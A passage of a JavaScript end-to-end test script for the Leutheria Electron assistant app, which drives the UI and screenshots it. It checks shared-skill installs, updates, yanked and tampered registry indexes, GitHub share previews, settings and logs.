    check(`${T} Open on GitHub opens a github.com page, copies nothing`, opened && /^https:\/\/github\.com\/AnuragK-O\/leutheria-skills\/new\/main\?filename=/.test(last.url || "") && last.copied === 0);
    await main.eval(`document.querySelector(".share-done")?.scrollIntoView({ block: "center" })`);
    await main.shot(file("share-opened"));

    const LONG = "export_quarterly_reports_to_the_shared_finance_drive_and_notify_the_team";
    await main.eval(pick(LONG));
    await main.eval(clickText("#library-detail button", "Preview share"));
    check(`${T} a too-long file offers copy-and-open`, await main.waitFor(`/Copy and open GitHub/.test(document.getElementById("library-detail").textContent) && document.querySelector(".share-flagged li")`));
    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
    await main.shot(file("share-preview-long"));
    await main.eval(clickText("#library-detail button", "Copy and open GitHub"));
    await main.waitFor(`document.querySelector(".share-done")`);
    const recordLong = await hooks.eval(`__leutheriaTest.shared()`);
    const lastLong = recordLong[recordLong.length - 1] || {};
    check(`${T} the long file goes to the clipboard and the page opens without it`, recordLong.length === record.length + 1 && lastLong.copied > 1000 && !/value=/.test(lastLong.url));
    await main.eval(`document.querySelector(".share-done")?.scrollIntoView({ block: "center" })`);
    await main.shot(file("share-copied"));

    await command("registry badshare");
    await main.eval(pick("archive_downloads"));
    await main.eval(clickText("#library-detail button", "Done"));
    await main.eval(clickText("#library-detail button", "Preview share"));
    await main.waitFor(`document.querySelector(".share-preview")`);
    await main.eval(clickText("#library-detail button", "Open on GitHub"));
    const refused = await main.waitFor(`/didn't point at github\\.com/.test(document.getElementById("library-detail").textContent)`);
    check(`${T} main.js refuses a share URL outside the registry repo's new-file page`, refused && (await hooks.eval(`__leutheriaTest.shared().length`)) === recordLong.length);
    await main.eval(`document.querySelector(".share .callout")?.scrollIntoView()`);
    await main.shot(file("share-refused-url"));
    await command("registry ok");

    await main.eval(pick("create_project"));
    check(`${T} a built-in skill has no Share`, await main.eval(`!/Preview share/.test(document.getElementById("library-detail").textContent)`));

    // --- the narrow width
    await main.size(WIDTHS[WIDTHS.length - 1], HEIGHT);
    await main.eval(`document.querySelector('.segmented button[data-kind="shared"]').click()`);
    await main.eval(pick("clean_system_caches"));
    await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 4`);
    await main.shot(file(`w${WIDTHS[WIDTHS.length - 1]}-shared-install`));
    check(`${T} the install card at ${WIDTHS[WIDTHS.length - 1]}px has no horizontal overflow`, await main.eval(noOverflow));
    await main.eval(`document.querySelector('.segmented button[data-kind="all"]').click()`);
    await main.eval(pick("archive_downloads"));
    await main.eval(clickText("#library-detail button", "Cancel"));
    await main.eval(clickText("#library-detail button", "Preview share"));
    await main.waitFor(`document.querySelector(".share-preview")`);
    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
    await main.shot(file(`w${WIDTHS[WIDTHS.length - 1]}-share-preview`));
    check(`${T} the share preview at ${WIDTHS[WIDTHS.length - 1]}px has no horizontal overflow`, await main.eval(noOverflow));
    await main.size(WIDTHS[0], HEIGHT);

    // --- the skills panel
    await main.eval(`window.leutheria.showPanel("skills")`);
    const panel = await Page.attach("panel.html?id=skills");
    await panel.send("Emulation.setDefaultBackgroundColorOverride", { color: backdrop });
    await panel.waitFor(`document.body.classList.contains("ready")`, 8000);
    await panel.eval(`document.querySelector('#panel-tools .segmented button[data-kind="shared"]').click()`);
    check(`${T} the skills panel lists shared skills`, await panel.waitFor(`document.querySelectorAll("#library-group-shared-discover .list-row").length >= 3`));
    await panel.shot(file("panel-skills-shared"));
    await panel.eval(clickText("#library-list .list-row-name", "clean_system_caches"));
    check(`${T} the panel's install card shows every step too`, await panel.waitFor(`document.querySelectorAll("#library-detail .install-card .install-steps .step").length === 4`));
    await panel.shot(file("panel-skills-install"));
    await panel.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
    await panel.shot(file("panel-skills-install-bottom"));
    check(`${T} the panel has no horizontal overflow`, await panel.eval(`document.documentElement.scrollWidth <= window.innerWidth`));
    await panel.eval(`document.querySelector('[data-ctl="orientation"]').click()`);
    await panel.waitFor(`document.body.dataset.orientation === "horizontal"`);
    await sleep(500);
    await panel.shot(file("panel-skills-shared-horizontal"));
    await panel.eval(`document.querySelector('[data-ctl="orientation"]').click()`);
    await panel.eval(`document.querySelector('[data-ctl="close"]').click()`);
  } finally {
    // The next pass reuses the debugging ports, so Electron must really be
    // gone: SIGTERM, then SIGKILL if it hasn't exited (it sometimes ignores
    // the first while a panel window is open).
    for (const child of [electron, mock]) {
      if (child.exitCode !== null || child.signalCode !== null) continue;
      const gone = new Promise((resolve) => child.once("exit", () => resolve(true)));
      child.kill();
      if (!(await Promise.race([gone, sleep(4000)]))) {
        child.kill("SIGKILL");
        await Promise.race([gone, sleep(3000)]);
      }
    }
    await sleep(600);
  }
}

// --- the shared-skill registry against the REAL agent and a real signed index --
// agent/scripts/registry_e2e_check.py --fixture builds a local registry with
// the registry repo's own pipeline (keygen, stubbed screener, signed index),
// serves it, and starts the real agent server sandboxed (temp HOME and state,
// test registry URL + key, TTS stubbed, no model). This pass drives Electron
// against it, so every field the UI reads comes from the agent itself, not
// from the mock's idea of it. Commands to the fixture (v2, yank, tamper)
// change what the registry serves mid-run.

async function runRegistryReal(theme) {
  const dir = path.join(OUT, theme, "registry-real");
  fs.mkdirSync(dir, { recursive: true });
  const file = (name) => path.join(dir, `${name}.png`);
  const T = `[${theme}] registry (real agent):`;
  const python = arg("python", path.join(APP_DIR, "..", "agent", ".venv", "bin", "python"));
  const fixture = spawn(python, [path.join(APP_DIR, "..", "agent", "scripts", "registry_e2e_check.py"), "--fixture"], {
    cwd: path.join(APP_DIR, "..", "agent"),
    stdio: ["pipe", "pipe", "ignore"],
  });
  const lines = [];
  let buffered = "";
  fixture.stdout.on("data", (chunk) => {
    buffered += chunk;
    let index;
    while ((index = buffered.indexOf("\n")) >= 0) {
      lines.push(buffered.slice(0, index));
      buffered = buffered.slice(index + 1);
    }
  });
  const nextLine = async (test, ms) => {
    const deadline = Date.now() + ms;
    while (Date.now() < deadline) {
      const found = lines.findIndex(test);
      if (found >= 0) return lines.splice(found, 1)[0];
      if (fixture.exitCode !== null) break;
      await sleep(100);
    }
    return null;
  };
  const tell = async (cmd) => {
    fixture.stdin.write(`${cmd}\n`);
    const reply = await nextLine((line) => line === `ok ${cmd}` || line.startsWith(`error ${cmd}`), 120000);
    if (reply !== `ok ${cmd}`) throw new Error(`fixture ${cmd}: ${reply}`);
  };

  let electron = null;
  try {
    const ready = await nextLine((line) => line.startsWith("{"), 240000);
    if (!ready) throw new Error("the registry fixture didn't start");
    const fx = JSON.parse(ready);
    if (/:8765\b/.test(fx.url)) throw new Error("fixture picked 8765");
    const env = {
      ...childEnv(fx.token),
      LEUTHERIA_AGENT_URL: fx.url,
      LEUTHERIA_NO_SPAWN: "1",
      LEUTHERIA_CAPTURE_DIR: path.join(dir, "_state"),
      LEUTHERIA_CAPTURE_THEME: theme,
      LEUTHERIA_TEST_HOOKS: "1",
    };
    delete env.ELECTRON_RUN_AS_NODE;
    electron = spawn(require("electron"), [".", `--remote-debugging-port=${DEBUG_PORT}`, `--inspect=${INSPECT_PORT}`], { cwd: APP_DIR, env, stdio: "ignore" });

    const hooks = await Page.attach(null, 20000, INSPECT_PORT);
    await hooks.waitFor(`globalThis.__leutheriaTest`, 15000);
    await hooks.eval(`(() => { const d = __leutheriaTest.display().bounds; __leutheriaTest.setCursor({ x: d.x + Math.round(d.width / 2), y: d.y + Math.round(d.height / 2) }); })()`);
    const main = await Page.attach("renderer/index.html");
    await main.size(WIDTHS[0], HEIGHT);
    check(`${T} connects to the real agent`, await main.waitFor(`document.getElementById("status").dataset.state === "connected"`, 15000));
    await main.waitFor(`window.LX && LX.state.inventory`, 8000);
    if (theme === "light") await main.eval(`document.getElementById("theme-toggle").click()`);
    const rowNames = (group) => `[...document.querySelectorAll("#library-group-${group} .list-row")].map((n) => n.dataset.name)`;
    const pick = (name) => clickText("#library-list .list-row-name", name);
    const card = `document.querySelector("#library-detail .install-card")`;
    const refresh = async () => {
      await main.eval(`document.querySelector(".shared-refresh").click()`);
      await sleep(1500);
    };

    await main.eval(clickNav(NAV.library));
    await main.eval(`document.querySelector('.segmented button[data-kind="shared"]').click()`);
    check(`${T} Discover lists the two published skills (the held one isn't there)`, await main.waitFor(`${rowNames("shared-discover")}.join() === "list_notes_folder,repo_status"`, 20000));
    await main.eval(`LX.library.reveal("shared:")`);
    check(
      `${T} the overview reads the index as verified, with the key id`,
      await main.waitFor(`document.querySelector('.shared-index-state[data-state="verified"]') && /Signed with registry key [0-9a-f]{16}/.test(document.getElementById("library-detail").textContent)`)
    );
    await main.shot(file("overview"));

    await main.eval(pick("repo_status"));
    check(
      `${T} the install card shows every step from the agent's preview, run_command flagged`,
      await main.waitFor(
        `${card} && ${card}.querySelectorAll(".install-steps .step").length === 2 && ${card}.querySelectorAll(".step-command").length === 1 && /git status --short/.test(${card}.textContent) && ${card}.querySelector(".shared-cmd-warning")`,
        15000
      )
    );
    check(
      `${T} the card shows the local model description and the author's text`,
      await main.eval(`/^Shared skill by octo-cat/.test(${card}.querySelector(".shared-model-desc").textContent) && /Show the time, then the git status/.test(${card}.querySelector(".shared-author-desc").textContent)`)
    );
    await main.shot(file("install-card"));
    await main.eval(`${card}.querySelector(".btn-hot").click()`);
    check(
      `${T} Install: the card settles, the skill is in the inventory as imported`,
      (await main.waitFor(`${card} && ${card}.classList.contains("resolved")`, 15000)) &&
        (await main.waitFor(`LX.state.inventory.skills.some((s) => s.name === "repo_status" && s.origin === "imported" && s.registry.version === 1)`, 10000)) &&
        (await main.waitFor(`${rowNames("shared-installed")}.join() === "repo_status"`))
    );
    await main.shot(file("installed"));

    await tell("v2");
    await refresh();
    check(`${T} v2 published: the row says update`, await main.waitFor(`document.querySelector('#library-list .list-row[data-name="repo_status"] .badge-warning')`, 10000));
    await main.eval(pick("list_notes_folder"));
    await main.eval(pick("repo_status"));
    check(
      `${T} the update is a new approval with the new step marked; v1 is still installed`,
      (await main.waitFor(
        `${card} && /Update to v2/.test(${card}.textContent) && ${card}.querySelectorAll(".install-steps .step").length === 3 && ${card}.querySelectorAll(".install-steps .badge-accent").length === 1`,
        15000
      )) && (await main.eval(`LX.state.inventory.skills.find((s) => s.name === "repo_status").registry.version === 1`))
    );
    await main.shot(file("update-offered"));

    await tell("yank");
    await refresh();
    check(
      `${T} yanked: installed v1 shows withdrawn`,
      await main.waitFor(`document.querySelector('#library-list .list-row[data-name="repo_status"] .badge-danger') && document.querySelector("#library-detail .shared-withdrawn")`, 10000)
    );
    await main.shot(file("withdrawn"));

    await tell("tamper");
    await refresh();
    await main.eval(`LX.library.reveal("shared:")`);
    check(
      `${T} tampered index: the red refused state, nothing installable, installed kept`,
      (await main.waitFor(`document.querySelector('#library-list .shared-index-refused[data-index="verification_failed"]')`, 10000)) &&
        (await main.eval(`!document.getElementById("library-group-shared-discover") && ${rowNames("shared-installed")}.join() === "repo_status" && !document.querySelector("#library-detail .install-card")`))
    );
    await main.shot(file("index-refused"));
    await tell("untamper");
    await refresh();

    await main.eval(`document.querySelector('.segmented button[data-kind="all"]').click()`);
    await main.eval(pick("client_notes"));
    await main.eval(clickText("#library-detail button", "Preview share"));
    check(
      `${T} share preview from the agent: target path, the home path change, the flagged email, the file`,
      await main.waitFor(
        `document.querySelector(".share-preview") && /^skills\\/client_notes\\/[0-9a-f]{64}\\.json$/.test(document.querySelector(".share-path").textContent) && document.querySelectorAll(".share-changes li").length >= 1 && [...document.querySelectorAll(".share-flagged li")].some((li) => /bob@example\\.com/.test(li.textContent)) && /"steps"/.test(document.querySelector(".share-json").textContent)`,
        15000
      )
    );
    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
    await main.shot(file("share-preview"));
    await main.eval(clickText("#library-detail button", "Open on GitHub"));
    const opened = await main.waitFor(`document.querySelector(".share-done")`, 10000);
    const record = await hooks.eval(`__leutheriaTest.shared()`);
    const last = record[record.length - 1] || {};
    check(
      `${T} Open on GitHub: the registry repo's new-file page recorded (nothing opened), nothing copied`,
      opened && /^https:\/\/github\.com\/AnuragK-O\/leutheria-skills\/new\/main\?filename=skills%2Fclient_notes%2F/.test(last.url || "") && last.copied === 0
    );
    await main.shot(file("share-opened"));
  } finally {
    for (const child of [electron, fixture]) {
      if (!child || child.exitCode !== null || child.signalCode !== null) continue;
      const gone = new Promise((resolve) => child.once("exit", () => resolve(true)));
      if (child === fixture) fixture.stdin.end("quit\n");
      else child.kill();
      if (!(await Promise.race([gone, sleep(child === fixture ? 10000 : 4000)]))) {
        child.kill("SIGKILL");
        await Promise.race([gone, sleep(3000)]);
      }
    }
    await sleep(600);
  }
}

async function runReal(main, theme, file) {
  await main.shot(file("real-assistant-empty"));

  await main.eval(clickNav(NAV.library));
  check(`[${theme}] real: library lists the catalog`, await main.waitFor(`document.querySelectorAll("#library-list .list-row").length > 5`));
  await main.shot(file("real-library-list"));
  check(
    `[${theme}] real: every capability is filed under a group`,
    await main.eval(`document.querySelectorAll("#library-list .list-row").length === LX.state.inventory.tools.length + LX.state.inventory.skills.length`)
  );
  const inOther = await main.eval(`[...document.querySelectorAll('#library-group-other .list-row')].map((n) => n.dataset.name).join(", ")`);
  check(`[${theme}] real: nothing is left in the Other group`, !inOther, inOther);
  await main.eval(`document.querySelector("#library-list .list-row").click()`);
  await main.shot(file("real-library-detail-first"));
  await main.eval(`document.querySelector(".library-rows").scrollTop = 1e6`);
  await main.shot(file("real-library-list-end"));
  // The longest description in the catalog, and one that names other capabilities.
  for (const name of ["set_timer", "archive_folder", "run_command"]) {
    if (await main.eval(clickText("#library-list .list-row-name", name))) await main.shot(file(`real-library-detail-${name}`));
  }
  await main.eval(setInput("#view-actions .search input", "zip"));
  await main.shot(file("real-library-search"));
  await main.eval(setInput("#view-actions .search input", ""));
  await main.eval(`document.querySelector('.filter-chip[data-filter="asks"]').click()`);
  await main.shot(file("real-library-filter-asks"));
  await main.eval(`document.querySelector('.filter-chip[data-filter="asks"]').click()`);
  await main.eval(`document.querySelectorAll(".list-group-label").forEach((n) => n.click())`);
  await main.shot(file("real-library-collapsed"));
  await main.eval(`document.querySelectorAll(".list-group-label").forEach((n) => n.click())`);
  // The last row is a tool; get_time-like safe ones sit there. Toggle "ask
  // before running" (the second switch) on and put it back with Reset.
  await main.eval(`[...document.querySelectorAll("#library-list .list-row")].pop().click()`);
  const overridden = await main.eval(`Boolean(document.querySelector("#library-detail .setting-note"))`);
  if (overridden) {
    check(`[${theme}] real: preference toggle (skipped: that entry is already customized)`, true);
  } else {
    const before = await main.eval(`document.querySelectorAll("#library-detail .switch")[1].getAttribute("aria-checked")`);
    await main.eval(`document.querySelectorAll("#library-detail .switch")[1].click()`);
    check(
      `[${theme}] real: set_preference round-trips`,
      await main.waitFor(`document.querySelectorAll("#library-detail .switch")[1].getAttribute("aria-checked") !== "${before}" && document.querySelector("#library-detail .setting-note")`)
    );
    await main.shot(file("real-library-detail-customized"));
    await main.eval(clickText("#library-detail .link-button", "Reset"));
    check(
      `[${theme}] real: Reset restores the default`,
      await main.waitFor(`document.querySelectorAll("#library-detail .switch")[1].getAttribute("aria-checked") === "${before}" && !document.querySelector("#library-detail .setting-note")`)
    );
  }

  await main.eval(clickNav(NAV.activity));
  check(`[${theme}] real: activity renders`, await main.waitFor(`document.querySelector("#activity-body .stat-grid")`));
  await main.shot(file("real-activity"));

  await main.eval(clickNav(NAV.permissions));
  check(`[${theme}] real: permissions renders`, await main.waitFor(`document.querySelectorAll("#permissions-body .card").length === 3`));
  await main.shot(file("real-permissions"));

  await main.eval(clickNav(NAV.voice));
  check(`[${theme}] real: voice settings load`, await main.waitFor(`document.querySelector('#voice-body [data-key="endpoint_silence_ms"] input')`, 12000));
  await main.shot(file("real-voice-settings"));
  await main.eval(`document.getElementById("view-voice").scrollTop = 1e6`);
  await main.shot(file("real-voice-settings-bottom"));
  const original = await main.eval(`document.querySelector('#voice-body [data-key="endpoint_silence_ms"] input').value`);
  await main.eval(setInput('#voice-body [data-key="endpoint_silence_ms"] input', "100"));
  await main.eval(clickText("#view-actions button", "Save changes"));
  check(
    `[${theme}] real: the agent refuses a bad value and it's shown on the field`,
    (await main.waitFor(`document.querySelector("#voice-body .callout-danger")`)) &&
      (await main.eval(`/between 240 and 5000/.test(document.querySelector('#voice-body [data-key="endpoint_silence_ms"] .field-error')?.textContent || "")`))
  );
  await main.eval(clickText("#view-actions button", "Revert"));
  check(
    `[${theme}] real: Revert restores the saved value, nothing was written`,
    await main.eval(`document.querySelector('#voice-body [data-key="endpoint_silence_ms"] input').value === ${JSON.stringify(original)} && !document.querySelector("#voice-body .callout-danger")`)
  );

  await main.eval(clickNav(NAV.logs));
  check(`[${theme}] real: logs show the bridge stream`, await main.waitFor(`/\\[bridge\\]/.test(document.getElementById("logs").textContent)`));
  await main.shot(file("real-logs"));
}

(async () => {
  fs.mkdirSync(OUT, { recursive: true });
  for (const theme of THEMES) {
    if (!PANELS_ONLY && !SHARED_ONLY) {
      try {
        await runTheme(theme);
      } catch (err) {
        check(`[${theme}] run completed`, false, err.message);
      }
    }
    if (WITH_PANELS && !SHARED_ONLY) {
      try {
        await runPanels(theme);
      } catch (err) {
        check(`[${theme}] panels: run completed`, false, err.message);
      }
    }
    if (REGISTRY_REAL) {
      try {
        await runRegistryReal(theme);
      } catch (err) {
        check(`[${theme}] registry (real agent): run completed`, false, err.message);
      }
    }
    if (WITH_SHARED && !PANELS_ONLY) {
      try {
        await runShared(theme);
      } catch (err) {
        check(`[${theme}] shared: run completed`, false, err.message);
      }
    }
  }
  console.log(failures ? `${failures} check(s) failed` : `all checks passed; screenshots in ${OUT}`);
  process.exit(failures ? 1 : 0);
})();
